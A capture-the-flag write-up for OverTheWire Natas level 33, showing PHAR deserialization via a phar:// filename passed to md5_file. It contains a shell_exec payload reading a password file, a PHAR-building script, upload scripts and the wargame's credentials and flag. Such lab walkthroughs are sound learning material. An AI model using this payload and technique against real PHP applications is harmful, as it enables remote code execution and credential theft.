# Natas Level 33 Writeup (natas33) – OverTheWire

## Overview

This level focuses on exploiting **PHP PHAR deserialization**.  
The goal is to find the password for the next level.

## Observation

When we open the page, we see a file upload form:

> **Upload a file**

There is also a link to view the source code:

```text
index-source.html
```

The source code contains an `Executor` class:

```php
class Executor{
    private $filename=""; 
    private $signature='adeafbadbabec0dedabada55ba55d00d';
    private $init=False;

    function __construct(){
        $this->filename=$_POST["filename"];
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        }
    }
    function __destruct(){
        chdir("/natas33/upload/");
        if(md5_file($this->filename) == $this->signature){
            echo "Congratulations! Running firmware update: $this->filename <br>";
            passthru("php " . $this->filename);
        }
        else{
            echo "Failur! MD5sum mismatch!<br>";
        }
    }
}
```

The upload code creates an `Executor` object, but there is no direct `unserialize()` call.

## Finding the Password

### Using Browser & BurpSuite

1. First create a PHP file that reads the password:

    ```php
    <? echo shell_exec("cat /etc/natas_webpass/natas34")?>
    ```

    Save it as:

    ```text
    shell.php
    ```

2. Upload `shell.php` normally and intercept the request in BurpSuite.

3. Change the filename in the request to:

    ```text
    shell.php
    ```
    so the uploaded file is stored with that name.

4. Now create a PHAR file containing a serialized `Executor` object.

    ```php
    <?php
    class Executor{
        private $filename = "shell.php";
        private $signature = true;
        private $init = false;
    }

    $phar = new Phar('natas.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');

    $object = new Executor();
    $phar->setMetadata($object);

    $phar->stopBuffering();
    ?>
    ```

5. Create the PHAR file:

    ```bash
    php -d phar.readonly=false natas33.php
    ```

6. Upload `natas.phar` and intercept the request in BurpSuite.

7. Change the filename to:

    ```text
    phar://natas.phar/test.txt
    ```

    The request contains:

    ```http
    Content-Disposition: form-data; name="filename"

    phar://natas.phar/test.txt
    ```

8. The application calls:

    ```php
    md5_file($this->filename)
    ```

    with the `phar://` stream.

9. PHP reads the PHAR file and deserializes its metadata, creating our `Executor` object.

10. Our object contains:

    ```text
    filename = shell.php
    signature = true
    ```

11. Therefore:

    ```php
    md5_file("shell.php") == true
    ```

    is true because of PHP's loose comparison.

12. The destructor then executes:

    ```php
    passthru("php " . $this->filename);
    ```

    which runs:

    ```text
    php shell.php
    ```

13. The response contains the password for **natas34**.

#### Proof

```text
Congratulations! Running firmware update: shell.php
cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK
```

### Using Python

```python
import requests

target = 'http://natas33.natas.labs.overthewire.org/index.php'
auth = ('natas33', 'kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL')

shell = b'''<? echo shell_exec("cat /etc/natas_webpass/natas34") ?>'''

# Upload shell.php
data = {
    'filename': 'shell.php',
    'submit': 'Upload File'
}

files = {
    'uploadedfile': ('shell.php', shell)
}

requests.post(target, auth=auth, data=data, files=files)
print("Shell Uploaded!!")

# Upload the PHAR file
with open('natas.phar', 'rb') as f:
    data = {
        'filename': 'phar://natas.phar/test.txt',
        'submit': 'Upload File'
    }
    
    files = {
        'uploadedfile': ('natas.phar', f)
    }

    r = requests.post(target, auth=auth, data=data, files=files)

print(f"Password for next level is: {r.text[-33:-1]}")
```

## Vulnerability

The application uses `md5_file()` on a user-controlled filename.

By using the `phar://` wrapper, PHP loads the PHAR metadata and automatically deserializes our `Executor` object.

We can then control the values used by `__destruct()` and execute our PHP file.

## Flag

`cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK`
